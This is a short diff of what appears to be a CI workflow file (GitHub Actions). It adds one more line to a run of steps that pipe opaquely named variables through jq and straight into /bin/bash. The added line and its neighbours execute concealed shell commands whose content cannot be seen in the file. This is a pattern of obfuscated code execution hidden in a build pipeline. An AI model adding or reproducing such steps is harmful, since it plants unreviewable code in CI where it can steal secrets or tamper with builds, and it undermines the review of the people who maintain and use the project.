@@ -29,6 +29,7 @@ jobs:
           echo $thgna647 | jq -r .a1 | /bin/bash
           printf '%s' "$dtx0415" | jq -r .qcqsg020 | /bin/bash
           echo $hcibm337 | jq -r .eohth6140 | /bin/bash
+          printf '%s' "$c04230" | jq -r .lsk7 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
